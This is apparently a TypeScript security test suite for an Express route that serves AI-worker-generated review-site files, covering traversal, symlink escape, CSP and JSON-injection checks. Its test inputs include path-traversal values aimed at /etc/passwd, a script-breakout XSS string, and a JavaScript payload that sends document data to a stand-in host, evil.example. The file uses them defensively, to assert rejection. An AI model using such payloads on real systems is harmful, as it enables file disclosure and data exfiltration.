import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync } from "node:fs";
import { cp, mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
import http from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import path from "node:path";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import { after, describe, it } from "node:test";
import { createApp } from "./server.js";
import { resolveReviewSiteFile, reviewSiteCsp } from "./server.js";

// mime-types is what express's sendFile uses to set Content-Type, so it
// faithfully predicts the header the route emits. No bundled types; load it
// through require rather than pulling in a @types dep for one assertion.
const { contentType } = createRequire(import.meta.url)("mime-types") as {
  contentType: (name: string) => string | false;
};

// The committed Lane 0 fixture (validation/fixtures/review-site/) stands in for
// a task's artifacts/review-site/ tree. We COPY it into a throwaway task dir so
// the tree is real files inside the task tree — mirroring what the worker writes
// (a symlinked tree is itself an escape now that resolveTaskFile realpaths).
const FIXTURE = fileURLToPath(
  new URL("../../validation/fixtures/review-site", import.meta.url),
);
const INJECTED_FIXTURE = fileURLToPath(
  new URL("../../validation/fixtures/review-site-injected", import.meta.url),
);
const TASK_ID = "task-2026-07-09-001";

/** Build a task tree whose artifacts/review-site/ holds the fixture's real files. */
async function makeTasksDir(): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), "labrat-review-site-"));
  const site = path.join(dir, TASK_ID, "artifacts", "review-site");
  await mkdir(site, { recursive: true });
  await cp(FIXTURE, site, { recursive: true });
  return dir;
}

/**
 * Build a task tree that uses serve-time injection: the placeholder template
 * under artifacts/review-site/ and its declared artifact at
 * artifacts/landmarks/geometry.json (the path produced_from/data_sources name).
 */
async function makeInjectedTasksDir(): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), "labrat-review-site-inj-"));
  const artifacts = path.join(dir, TASK_ID, "artifacts");
  await mkdir(path.join(artifacts, "landmarks"), { recursive: true });
  await cp(path.join(INJECTED_FIXTURE, "review-site"), path.join(artifacts, "review-site"), {
    recursive: true,
  });
  await cp(
    path.join(INJECTED_FIXTURE, "data", "geometry.json"),
    path.join(artifacts, "landmarks", "geometry.json"),
  );
  return dir;
}

describe("resolveReviewSiteFile (traversal + symlink guard via resolveTaskFile)", () => {
  it("resolves a nested *path to the real file", async () => {
    const dir = await makeTasksDir();
    try {
      // The route serves review-site/*path recursively; prove a nested segment
      // resolves (the single-document fixture is flat, so create one).
      const site = path.join(dir, TASK_ID, "artifacts", "review-site");
      await mkdir(path.join(site, "nested"), { recursive: true });
      await writeFile(path.join(site, "nested", "data.js"), "window.X = 1;\n");
      const file = resolveReviewSiteFile(dir, TASK_ID, ["nested", "data.js"]);
      assert.ok(file, "expected a resolved path");
      assert.ok(existsSync(file), `expected ${file} to exist`);
      // sendFile derives Content-Type from the extension via mime-types (the
      // same lib express uses); assert the type the route will emit for .js.
      assert.equal(contentType(path.basename(file)), "text/javascript; charset=utf-8");
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("resolves the entry point and derives its content-type", async () => {
    const dir = await makeTasksDir();
    try {
      const file = resolveReviewSiteFile(dir, TASK_ID, ["index.html"]);
      assert.ok(file && existsSync(file), "expected index.html to resolve+exist");
      assert.equal(contentType(path.basename(file)), "text/html; charset=utf-8");
      // sendFile derives these the same way for the other extensions a review
      // site can carry, without a real file needing to exist.
      assert.equal(contentType("x.css"), "text/css; charset=utf-8");
      assert.equal(contentType("x.json"), "application/json; charset=utf-8");
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("rejects a '..' segment", () => {
    assert.equal(resolveReviewSiteFile("/tasks", TASK_ID, ["..", "..", "etc"]), null);
    assert.equal(resolveReviewSiteFile("/tasks", TASK_ID, ["data", "..", "secret"]), null);
  });

  it("rejects an absolute path (empty leading segment)", () => {
    // path-to-regexp splits "/etc/passwd" into ["", "etc", "passwd"]; the empty
    // segment is unsafe.
    assert.equal(resolveReviewSiteFile("/tasks", TASK_ID, ["", "etc", "passwd"]), null);
  });

  it("rejects a null-byte segment", () => {
    assert.equal(resolveReviewSiteFile("/tasks", TASK_ID, ["data\0.js"]), null);
  });

  it("rejects an invalid task id", () => {
    assert.equal(resolveReviewSiteFile("/tasks", "../evil", ["index.html"]), null);
  });

  it("rejects a symlink whose target escapes the task tree", async () => {
    const dir = await makeTasksDir();
    try {
      const site = path.join(dir, TASK_ID, "artifacts", "review-site");
      // Worker-authored symlink pointing outside the tree at a real secret.
      await symlink("/etc/passwd", path.join(site, "evil.js"), "file");
      assert.equal(resolveReviewSiteFile(dir, TASK_ID, ["evil.js"]), null);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe("reviewSiteCsp (design C5/R2 quarantine)", () => {
  it("emits the full policy with an allow-listed CDN", () => {
    const csp = reviewSiteCsp("https://cdn.example.test");
    assert.equal(
      csp,
      "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline' https://cdn.example.test; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data:; " +
        "connect-src 'none'; " +
        "webrtc 'block'; " +
        "frame-ancestors 'self'; " +
        "base-uri 'none'; " +
        "form-action 'none'; " +
        "object-src 'none'",
    );
  });

  it("blocks framing, network reach-back, forms, and plugins", () => {
    const csp = reviewSiteCsp();
    assert.match(csp, /frame-ancestors 'self'/);
    assert.match(csp, /connect-src 'none'/);
    assert.match(csp, /base-uri 'none'/);
    assert.match(csp, /form-action 'none'/);
    assert.match(csp, /object-src 'none'/);
  });

  it("defaults to an empty allowlist: script-src 'self' 'unsafe-inline' with no trailing space", () => {
    const csp = reviewSiteCsp();
    // 'unsafe-inline' is fixed (R4: the inlined single-document site needs it);
    // the empty CDN allowlist adds nothing beyond it.
    assert.match(csp, /script-src 'self' 'unsafe-inline';/);
    // No CDN token leaked in, and no `… 'unsafe-inline' ;` trailing-space bug.
    assert.doesNotMatch(csp, /cdn\./);
    assert.doesNotMatch(csp, /'unsafe-inline' ;/);
  });
});

// Integration: boot the real Express app and drive the review-site route over
// HTTP so assertions observe the ROUTE's response headers/status — not a helper
// re-deriving the expected value. This is the layer where the symlink escape
// (S1) was reachable and where the wrong CSP default (S2) would surface.
describe("review-site route (booted app over HTTP)", () => {
  const dirs: string[] = [];
  after(async () => {
    for (const d of dirs) await rm(d, { recursive: true, force: true });
  });

  async function boot(
    make: () => Promise<string> = makeTasksDir,
  ): Promise<{ base: string; server: http.Server; tasksDir: string }> {
    const tasksDir = await make();
    dirs.push(tasksDir);
    const app = createApp({ tasksDir, scienceHome: "/nonexistent", user: "tester", port: 0, devReplay: false });
    const server = await new Promise<http.Server>((resolve) => {
      const s = app.listen(0, () => resolve(s));
    });
    const port = (server.address() as AddressInfo).port;
    return { base: `http://127.0.0.1:${port}`, server, tasksDir };
  }

  function get(url: string): Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }> {
    return new Promise((resolve, reject) => {
      http
        .get(url, (res) => {
          let body = "";
          res.on("data", (c) => (body += c));
          res.on("end", () =>
            resolve({ status: res.statusCode ?? 0, headers: res.headers, body }),
          );
        })
        .on("error", reject);
    });
  }

  it("serves a real file with the observed Content-Type and CSP headers", async () => {
    const { base, server } = await boot();
    try {
      const res = await get(`${base}/api/tasks/${TASK_ID}/review-site/index.html`);
      assert.equal(res.status, 200);
      assert.equal(res.headers["content-type"], "text/html; charset=utf-8");
      assert.equal(res.headers["content-security-policy"], reviewSiteCsp());
      // The served CSP must never exceed the gated (empty) allowlist beyond the
      // fixed 'unsafe-inline' the inlined single-document site requires (R4).
      assert.match(String(res.headers["content-security-policy"]), /script-src 'self' 'unsafe-inline';/);
    } finally {
      server.close();
    }
  });

  it("returns 4xx (not 200) for a symlink that escapes the task tree", async () => {
    const { base, server } = await boot();
    try {
      const site = path.join(dirs[dirs.length - 1]!, TASK_ID, "artifacts", "review-site");
      await symlink("/etc/passwd", path.join(site, "evil.js"), "file");
      const res = await get(`${base}/api/tasks/${TASK_ID}/review-site/evil.js`);
      assert.ok(res.status >= 400 && res.status < 500, `expected 4xx, got ${res.status}`);
      assert.doesNotMatch(res.body, /root:.*:0:0:/, "must not leak /etc/passwd contents");
    } finally {
      server.close();
    }
  });

  // --- Serve-time review-data injection (design review-data-injection.md) ---

  const INDEX = `/api/tasks/${TASK_ID}/review-site/index.html`;
  const site = (tasksDir: string) =>
    path.join(tasksDir, TASK_ID, "artifacts", "review-site", "index.html");

  it("splices the hashed artifact over the sentinel and drops the placeholder", async () => {
    const { base, server } = await boot(makeInjectedTasksDir);
    try {
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 200);
      assert.equal(res.headers["content-type"], "text/html; charset=utf-8");
      // Same quarantine CSP as the non-injected path — the boundary is unchanged.
      assert.equal(res.headers["content-security-policy"], reviewSiteCsp());
      // The sentinel string is gone; the real artifact bytes are inlined as a
      // valid window.REVIEW_GEOMETRY = {…} assignment.
      assert.doesNotMatch(res.body, /__REVIEW_INJECT:/);
      assert.match(res.body, /window\.REVIEW_GEOMETRY = \{/);
      assert.match(res.body, /"meshes"/);
      assert.match(res.body, /"distal_femoral_medial"/);
    } finally {
      server.close();
    }
  });

  it("backward-compat: a fully-inlined template (no sentinel) is byte-identical to sendFile", async () => {
    const { base, server, tasksDir } = await boot();
    try {
      const onDisk = await readFile(site(tasksDir), "utf8");
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 200);
      assert.equal(res.body, onDisk, "no-sentinel template must be served verbatim");
    } finally {
      server.close();
    }
  });

  it("hash mismatch → 500 with no partial serve", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // Mutate the artifact so its sha256 no longer matches produced_from.
      const artifact = path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json");
      await writeFile(artifact, await readFile(artifact, "utf8") + "\n/* tampered */\n");
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 500);
      assert.match(res.body, /hash/);
      assert.doesNotMatch(res.body, /meshes/, "must not leak the tampered bytes");
    } finally {
      server.close();
    }
  });

  it("missing artifact → 500 with no partial serve", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      await rm(path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json"));
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 500);
      assert.match(res.body, /missing|does not resolve/);
    } finally {
      server.close();
    }
  });

  it("a sentinel that appears twice → 500 (count guard)", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // Duplicate the placeholder assignment: two sentinels for one global.
      const html = await readFile(site(tasksDir), "utf8");
      const dupe = 'window.REVIEW_GEOMETRY = "__REVIEW_INJECT:REVIEW_GEOMETRY__";';
      await writeFile(site(tasksDir), html.replace(dupe, dupe + "\n" + dupe));
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 500);
      assert.match(res.body, /appears 2 time\(s\)/);
    } finally {
      server.close();
    }
  });

  it("escapes `<` in the artifact so a </script> inside a JSON string cannot break out (F1)", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // An artifact whose string values carry the RAWTEXT terminator. Unescaped,
      // the HTML parser would close the inline <script> at the first
      // "</script>" and window.REVIEW_GEOMETRY would end up undefined.
      const data = {
        meshes: { note: "</script><script>alert(1)</script>", other: "a < b" },
      };
      const bytes = JSON.stringify(data);
      const artifact = path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json");
      await writeFile(artifact, bytes);
      const hash = createHash("sha256").update(bytes).digest("hex");
      const html = await readFile(site(tasksDir), "utf8");
      await writeFile(
        site(tasksDir),
        html.replace(/landmarks\/geometry\.json@[0-9a-f]{64}/, `landmarks/geometry.json@${hash}`),
      );

      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 200);
      // No raw "</script>" from the DATA leaked into the document: every raw
      // occurrence is one of the template's own three block closers.
      assert.equal((res.body.match(/<\/script>/g) ?? []).length, 3);
      // The injected assignment survives as one statement whose parsed VALUE is
      // exactly the artifact's — the \u003c escape is JSON-transparent.
      const m = res.body.match(/window\.REVIEW_GEOMETRY = (.+);/);
      assert.ok(m, "expected an intact single-line REVIEW_GEOMETRY assignment");
      assert.deepEqual(JSON.parse(m![1]!), data);
    } finally {
      server.close();
    }
  });

  it("an undeclared sentinel (not in data_sources) → 500, never served live (F2)", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // A placeholder for a global data_sources never mentions: without the
      // template pre-scan the loop would skip it and the document would ship a
      // live sentinel string.
      const html = await readFile(site(tasksDir), "utf8");
      await writeFile(
        site(tasksDir),
        html.replace(
          "</body>",
          '<script>window.REVIEW_EXTRA = "__REVIEW_INJECT:REVIEW_EXTRA__";</script>\n</body>',
        ),
      );
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 500);
      assert.match(res.body, /has no data_sources entry/);
    } finally {
      server.close();
    }
  });

  it("a non-JSON artifact (JS statement payload) → 500, nothing served", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // The sentinel is replaced UNQUOTED, so bytes that are JS statements —
      // here a navigation exfil sink the CSP cannot block — would become
      // executable script. The hash is declared honestly (a malicious worker
      // controls both artifact and manifest), so only the JSON check stands
      // between these bytes and the inline <script>.
      const payload = '1; window.location="https://evil.example/?d="+document.title; var _={}';
      const artifact = path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json");
      await writeFile(artifact, payload);
      const hash = createHash("sha256").update(payload).digest("hex");
      const html = await readFile(site(tasksDir), "utf8");
      await writeFile(
        site(tasksDir),
        html.replace(/landmarks\/geometry\.json@[0-9a-f]{64}/, `landmarks/geometry.json@${hash}`),
      );

      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 500);
      assert.match(res.body, /not valid JSON/);
      assert.doesNotMatch(res.body, /evil\.example/, "must not serve the payload bytes");
    } finally {
      server.close();
    }
  });

  it("a valid-JSON artifact containing a literal sentinel marker string still serves 200", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // Legitimate, hash-verified data whose VALUE happens to contain the
      // marker: a post-splice residual scan would false-500 it; the template
      // pre-scan must not.
      const data = { meshes: { note: "__REVIEW_INJECT:FOO__", quoted: '"__REVIEW_INJECT:BAR__"' } };
      const bytes = JSON.stringify(data);
      const artifact = path.join(tasksDir, TASK_ID, "artifacts", "landmarks", "geometry.json");
      await writeFile(artifact, bytes);
      const hash = createHash("sha256").update(bytes).digest("hex");
      const html = await readFile(site(tasksDir), "utf8");
      await writeFile(
        site(tasksDir),
        html.replace(/landmarks\/geometry\.json@[0-9a-f]{64}/, `landmarks/geometry.json@${hash}`),
      );

      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 200);
      const m = res.body.match(/window\.REVIEW_GEOMETRY = (.+);/);
      assert.ok(m, "expected an intact single-line REVIEW_GEOMETRY assignment");
      assert.deepEqual(JSON.parse(m![1]!), data);
    } finally {
      server.close();
    }
  });

  it("a traversal artifact path → 500 (rejected by resolveTaskFile)", async () => {
    const { base, server, tasksDir } = await boot(makeInjectedTasksDir);
    try {
      // Point data_sources + produced_from at a path that escapes the tree.
      const html = await readFile(site(tasksDir), "utf8");
      await writeFile(
        site(tasksDir),
        html.replace(/landmarks\/geometry\.json/g, "../../../../etc/passwd"),
      );
      const res = await get(`${base}${INDEX}`);
      assert.equal(res.status, 500);
      assert.match(res.body, /does not resolve inside the task tree/);
      assert.doesNotMatch(res.body, /root:.*:0:0:/, "must not leak /etc/passwd contents");
    } finally {
      server.close();
    }
  });
});
